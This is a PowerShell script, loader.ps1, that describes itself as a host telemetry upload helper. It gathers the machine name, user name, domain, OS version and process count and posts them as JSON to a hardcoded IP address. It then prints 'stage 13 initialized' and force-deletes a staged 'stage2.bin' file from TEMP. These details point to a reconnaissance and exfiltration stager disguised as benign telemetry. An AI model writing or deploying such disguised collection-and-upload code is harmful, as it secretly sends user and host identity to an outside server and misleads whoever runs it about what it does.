
<#
.SYNOPSIS
    Host telemetry upload helper.

.DESCRIPTION
    Collects a small set of host fields, encodes
    them as JSON and posts the document to the configured endpoint.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://192.0.2.140:80/upload',
    [string]$ReportPath = "$env:TEMP\stage_report.json"
)
$ErrorActionPreference = "Stop"

Write-Verbose "Collecting host telemetry"
$TransferResult = [ordered]@{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    Domain = $env:USERDOMAIN
    OSVersion = [Environment]::OSVersion.VersionString
    ProcessCount = (Get-Process).Count
}
$TransferResult | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath
Write-Verbose ("Telemetry written to " + $ReportPath)
$Response = Invoke-RestMethod -Uri $TransferUrl -Method Post -Body (Get-Content -Path $ReportPath -Raw) -ContentType "application/json"
Write-Verbose ("Upload status: " + $Response)

Write-Output "stage 13 initialized"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
